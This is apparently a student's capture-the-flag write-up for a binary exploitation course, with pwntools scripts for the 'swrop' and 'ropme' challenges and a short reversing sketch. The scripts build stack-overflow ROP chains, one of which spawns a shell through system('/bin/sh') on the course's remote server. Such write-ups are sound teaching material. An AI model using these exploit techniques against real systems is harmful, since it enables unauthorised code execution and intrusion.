# z5214048
## Wargame 6

swrop
===========================

Flag: COMP6447{this_was-easy}
> (but was it)?

General overview of problems faced
-------------------------------------
Had to hack the program:
1. Try sub/dec from ptr val of bin date string -fail
2. Ended up doing external offset to system alongside with the address oh /bin/sh in the local binary. Is it even an intended way given the flag text?


Script/Command used
------------------
```
#python2

from pwn import *

context.binary = './swrop'

io = remote("plzpwn.me", 6000)
#process('./swrop')
print(io.recvuntil('> '))

pay = 'A'*80
pay += p32(0xFFFFFFFA)
pay += '0'*52

# not used 1 
#pay += p32(0x080484D6)
# eax - ptr to bin date
# ebx - same, but otherwritten with rubbish
# edx - val of "bin date"
# ebp - no good

# 0x08048780 : dec ebp ; push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret

# after vuln
# ebx - bin sh value

# 0x0804852c : push ebx ; call 0x8048417



system_plt_ddoff=p32(0x08048390)
c_exit=p32(0xf7df63d0)
sh_str=p32(0x080485F0)

main = p32(0x08048529)
main_subret = p32(0x0804855F)

pay += system_plt_ddoff
pay += c_exit
pay += sh_str
pay += main_subret


print("pay: "+pay)
print("pay len: "+str(len(pay)))
print("=================sending pay===============")

io.sendline(pay)
io.interactive()


print(io.recv())

"""
0x08048780 - dec ebp
0x0804834d - pop ebx

```

ropme
=============
Flag: COMP6447{no_u_come_up_with_another_flag}


General overview of problems faced
-------------------------------------
Had to hack the program:
1. Like in "3001_simpy", had to re-channel registers to read FD first, and print it thereafter
2. Encountered many of my mess-ups, but done it right in the end

Probably not in my interest to say, but while the script works, it takes as-is the hypothesis that FD of flag is 3 always, which might not be necessarily the case. The solutions to it are,
* Pop the stack until you find the value of FD in it, OR
* keep calling main(), creating more and more FDs, and after, say, 150 calls, pick FD = 80.

Either way, since it works perfectly as it is, I post the script as-is as well.

Script/Command used
------------------
```
#python2

from pwn import *

context.binary = './ropme'

io = remote("plzpwn.me", 6003)
#process('./ropme')
print(io.recvuntil('Gimme data: '))

vuln = p32(0x0804850A)
main = p32(0x08048539)

before_bye = p32(0x804858d)

pure_inc_ecx = p32(0x08048792)
pure_inc_edx = p32(0x08048505)
pure_inc_edx_alt = p32(0x080484fc)

pure_xor_edx = p32(0x080484ef)

pure_mov_ecx_to_eax = p32(0x080484f9)
pure_mov_edx_to_eax_and_ebx = p32(0x08048500)
pure_mov_esp_to_ebp = p32(0x080484ec)
pure_mov_edx_to_ebx = p32(0x08048502)

pure_x2_ecx = p32(0x080484ba)

pure_sub4_from_ecx = p32(0x080484f5)

pure_int80 = p32(0x080484f2)

# 0x080484df : push eax ; call edx
dirty_push1 = p32(0x080484df)

# 0x080484eb : push ebp ; mov ebp, esp ; ret
dirty_push2 = p32(0x080484eb)

# 0x08048534 : mov ecx, esp ; nop ; leave ; ret
dirty_killstack = p32(0x08048534)

pure_mov_valueatptr_esp_to_ebx = p32(0x0804841b) # or 0x0804841f / 0x0804841d. 1b is longest -> more legit

# 0x08048372 : push 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
# idea: xor ebx
# Replacable: pure_xor_edx + pure_mov_edx_to_ebx
dirty1_xor = p32(0x08048372)


pay = "AAAA"*2 # padding
# ecx is pre set to ESP, now off setting it slightly to create some space
# (dangerous technique as we might find ourselves on the dangerous grounds but ok)

pay += pure_sub4_from_ecx*10

pay += pure_xor_edx #edx=0
pay += pure_inc_edx*3 #ebx=3
pay += pure_mov_edx_to_eax_and_ebx #eax=ebx=edx=3
pay += pure_inc_edx*(21+40) #edx=44
pay += pure_int80

pay += pure_xor_edx #edx=0
pay += pure_inc_edx*4 #edx=4
pay += pure_mov_edx_to_eax_and_ebx #eax=ebx=edx=4

pay += pure_xor_edx #edx=0
pay += pure_inc_edx*1 #edx=1
pay += pure_mov_edx_to_ebx #ebx=edx=1
pay += pure_inc_edx*43 #edx=64
pay += pure_int80
pay += main

print("pay: "+pay)
print("pay len: "+str(len(pay)))
print("=================sending pay===============")

io.sendline(pay)
io.interactive()
```

roproprop
=============
Flag: none yet

General overview of problems faced
-------------------------------------
1. RopChain doesn't find any of "int 80", which implies having to mess libc. Will all due respect, because of #bloody_malware, no time to lose


reversing session
======================
Guess: some data struct handling code?

```
// var_4 -> buffer
// var_8 -> i
// var_C -> c
// the output file was compiled 32 bit

int main()
{
	int c = 0;
	int i = 0;
	int buffer;

	for(int i = 0; i <= 9; i++)
	{
		buffer = malloc(8); // push 8 irl
		assert (*buffer != NULL); // https://stackoverflow.com/a/2862748
		
		if(c)
		{
			buffer = c; 			
		}
		
		c = buffer;
		buffer->value = (i+65) & 0x000000FF; // to byte/mod	
	}
}
```


